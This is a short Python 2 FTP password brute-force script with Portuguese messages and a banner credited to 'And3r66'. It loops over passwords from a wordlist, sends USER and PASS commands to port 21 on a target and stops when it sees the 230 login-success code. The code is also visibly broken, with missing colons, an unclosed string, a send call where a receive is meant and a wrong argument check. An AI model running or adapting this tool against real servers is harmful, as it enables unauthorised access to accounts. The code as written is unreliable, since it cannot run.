#!/usr/bin/python
#coding: utf-8

import socket
import re
import sys

def Apresentacao():
    print("""\033[31m


 ________  ________  ___  ___  _________  _______   ________ _________  ________
|\   __  \|\   __  \|\  \|\  \|\___   ___\\  ___ \ |\  _____\\___   ___\\   __  \
\ \  \|\ /\ \  \|\  \ \  \\\  \|___ \  \_\ \   __/|\ \  \__/\|___ \  \_\ \  \|\  \
 \ \   __  \ \   _  _\ \  \\\  \   \ \  \ \ \  \_|/_\ \   __\    \ \  \ \ \   ____\
  \ \  \|\  \ \  \\  \\ \  \\\  \   \ \  \ \ \  \_|\ \ \  \_|     \ \  \ \ \  \___|
   \ \_______\ \__\\ _\\ \_______\   \ \__\ \ \_______\ \__\       \ \__\ \ \__\
    \|_______|\|__|\|__|\|_______|    \|__|  \|_______|\|__|        \|__|  \|__|

                                                   \033[1mBy:And3r66\033[1;m
""")

if len(sys.argv) < 2:
    print "Utilize Python BruteFTP.py 127.0.0.1 Usuário "
    sys.exit(0)
Usuário = sys.argv[2]

file = open("wordlist.txt")
for linha  in file.readlines()

   print "Realizando testes com %s:%s"(Usuário,linha)
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((sys.argv[1],21))
   s.recv(1024)
   s.send("user "+Usuário+"\r\n")
   s.send(1024)
   s.send("PASS "+linha+"\r\n")
   resulta = s.recv(1024)
   s.send("QUIT\r\n")

   if re.search("230",resulta)
     print "[S] ==> SENHA ENCONTRADA  <==
     break
 else:
     print "[X] Acesso Negado [X]\n"
